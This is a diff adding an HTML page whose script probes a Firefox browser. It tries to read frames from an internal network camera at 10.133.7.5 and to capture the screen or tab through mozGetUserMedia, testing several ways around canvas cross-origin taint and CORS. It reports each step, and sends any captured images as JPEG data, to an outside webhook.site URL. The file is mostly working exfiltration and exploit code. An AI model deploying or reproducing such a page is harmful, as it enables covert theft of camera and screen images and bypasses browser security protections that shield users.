@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html><head><title>J</title></head>
+<body style="margin:0;background:#111;">
+<script>
+var W='https://webhook.site/ec3399e6-089c-4f36-98b5-b58028d7bc1b';
+var N=0;
+function rpt(k,v){N++;new Image().src=W+'?n='+N+'&t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
+
+rpt('INIT','page=J|sec='+window.isSecureContext+'|opener='+(!!window.opener));
+
+var done=false;
+function processStream(label,stream){
+  if(done)return;done=true;
+  rpt('GOT_STREAM',label+'|tracks='+stream.getTracks().length);
+  var v=document.createElement('video');
+  v.srcObject=stream;v.autoplay=true;v.muted=true;
+  document.body.appendChild(v);
+  function grab(gl){
+    var w=v.videoWidth||1600,h=v.videoHeight||900;
+    rpt('GRAB',gl+'|'+w+'x'+h+'|rdy='+v.readyState);
+    if(w<=0||h<=0)return;
+    var c=document.createElement('canvas');c.width=w;c.height=h;
+    var ctx=c.getContext('2d');
+    try{ctx.drawImage(v,0,0,w,h)}catch(e){rpt('DRAW_E',gl+'|'+e.message);return}
+    try{var d=ctx.getImageData(0,0,20,1);
+      var px=Array.from(d.data);
+      rpt('PX',gl+'|nz='+px.filter(function(x){return x>0}).length+'|'+px.slice(0,40).join(','));
+    }catch(e){rpt('PX_E',gl+'|'+e.message)}
+    try{var du=c.toDataURL('image/jpeg',0.8);
+      rpt('DU',gl+'|len='+du.length);
+      if(du.length>1000){navigator.sendBeacon(W,gl+':'+du)}
+    }catch(e){rpt('DU_E',gl+'|'+e.message)}
+  }
+  v.onloadeddata=function(){grab('ld0');setTimeout(function(){grab('ld1')},2000);};
+  setTimeout(function(){grab('t2')},2000);
+}
+
+async function run(){
+  // Load camera image on this HTTPS page (mixed content)
+  var cam=document.createElement('img');
+  cam.src='http://10.133.7.5/stream';
+  cam.style.cssText='width:640px;height:480px;display:block';
+  document.body.appendChild(cam);
+  var camOK=false;
+  cam.onload=function(){if(!camOK){camOK=true;rpt('CAM_LOAD','ok')}};
+  cam.onerror=function(e){rpt('CAM_ERR','failed')};
+
+  // Test 1: Try drawImage with cross-origin camera (expect taint)
+  setTimeout(function(){
+    try{
+      var c=document.createElement('canvas');c.width=640;c.height=480;
+      var ctx=c.getContext('2d');
+      ctx.drawImage(cam,0,0,640,480);
+      rpt('DRAW_CAM','drawn');
+      try{
+        var d=ctx.getImageData(0,0,5,1);
+        rpt('CAM_PX','got pixels!|'+Array.from(d.data).slice(0,20).join(','));
+      }catch(e){rpt('CAM_PX_E',e.name+':'+e.message.substring(0,100))}
+      try{
+        var du=c.toDataURL();
+        rpt('CAM_DU','len='+du.length);
+        if(du.length>1000){navigator.sendBeacon(W,'cam:'+du)}
+      }catch(e){rpt('CAM_DU_E',e.name+':'+e.message.substring(0,100))}
+    }catch(e){rpt('DRAW_CAM_E',e.message)}
+  },3000);
+
+  // Test 2: Try to fetch camera with cors/no-cors
+  try{
+    var r=await fetch('http://10.133.7.5/stream',{mode:'no-cors'});
+    rpt('FETCH_NC','status='+r.status+'|type='+r.type+'|ok='+r.ok);
+  }catch(e){rpt('FETCH_NC_E',e.name+':'+e.message.substring(0,100))}
+
+  // Test 3: Try createImageBitmap from cross-origin img
+  setTimeout(async function(){
+    try{
+      var bmp=await createImageBitmap(cam);
+      rpt('BMP_CAM','w='+bmp.width+'|h='+bmp.height);
+      // Try drawing bitmap to canvas
+      var c2=document.createElement('canvas');c2.width=bmp.width;c2.height=bmp.height;
+      var ctx2=c2.getContext('2d');
+      ctx2.drawImage(bmp,0,0);
+      try{var d2=ctx2.getImageData(0,0,5,1);rpt('BMP_PX','got!|'+Array.from(d2.data).slice(0,20).join(','))}
+      catch(e){rpt('BMP_PX_E',e.name)}
+    }catch(e){rpt('BMP_E',e.name+':'+e.message.substring(0,100))}
+  },4000);
+
+  // Test 4: Try XMLHttpRequest to camera (no CORS headers expected)
+  try{
+    var xhr=new XMLHttpRequest();
+    xhr.open('GET','http://10.133.7.5/stream',true);
+    xhr.responseType='blob';
+    xhr.onload=function(){rpt('XHR_CAM','status='+xhr.status+'|size='+xhr.response.size)};
+    xhr.onerror=function(){rpt('XHR_CAM_E','network error')};
+    xhr.send();
+  }catch(e){rpt('XHR_E',e.message)}
+
+  // Test 5: Try fetching a single frame from camera (not stream)
+  try{
+    var r2=await fetch('http://10.133.7.5/snap',{mode:'no-cors'});
+    rpt('SNAP_NC','type='+r2.type);
+  }catch(e){}
+  try{
+    var r3=await fetch('http://10.133.7.5/capture',{mode:'no-cors'});
+    rpt('CAP_NC','type='+r3.type);
+  }catch(e){}
+
+  // Test 6: mozGetUserMedia with camera displayed, mandatory constraints
+  // Maybe having the camera visible makes browser source available?
+  setTimeout(async function(){
+    if(!navigator.mozGetUserMedia){rpt('MOZ_NA','no mozGUM');return}
+
+    // Try with mediaSource=browser (should capture current tab content)
+    await new Promise(function(resolve){
+      navigator.mozGetUserMedia(
+        {video:{mandatory:{mediaSource:'browser'}}},
+        function(s){rpt('MOZ_B_OK','got stream!');processStream('moz_b',s);resolve()},
+        function(e){rpt('MOZ_B_E',e.name+':'+e.message.substring(0,100));resolve()});
+    });
+
+    // Try with mediaSource=screen
+    await new Promise(function(resolve){
+      navigator.mozGetUserMedia(
+        {video:{mandatory:{mediaSource:'screen'}}},
+        function(s){rpt('MOZ_S_OK','got stream!');processStream('moz_s',s);resolve()},
+        function(e){rpt('MOZ_S_E',e.name+':'+e.message.substring(0,100));resolve()});
+    });
+
+    // Try with just video:true and mandatory (camera request)
+    await new Promise(function(resolve){
+      navigator.mozGetUserMedia(
+        {video:true},
+        function(s){rpt('MOZ_V_OK','got stream!');processStream('moz_v',s);resolve()},
+        function(e){rpt('MOZ_V_E',e.name+':'+e.message.substring(0,100));resolve()});
+    });
+  },5000);
+
+  // Test 7: Check about:config prefs via CSS
+  // Firefox allows checking prefs via @supports or media queries in some cases
+  try{
+    rpt('MEDIA','prefers-color='+window.matchMedia('(prefers-color-scheme: dark)').matches
+      +'|prefers-reduced='+window.matchMedia('(prefers-reduced-motion: reduce)').matches
+      +'|display-mode='+window.matchMedia('(display-mode: fullscreen)').matches);
+  }catch(e){}
+
+  // Test 8: Check Service Worker registration
+  try{
+    if(navigator.serviceWorker){
+      rpt('SW','available|controller='+(!!navigator.serviceWorker.controller));
+    }else{rpt('SW','unavailable')}
+  }catch(e){rpt('SW_E',e.message)}
+
+  rpt('DONE','J_sync_complete');
+}
+
+run();
+</script>
+</body>
+</html>
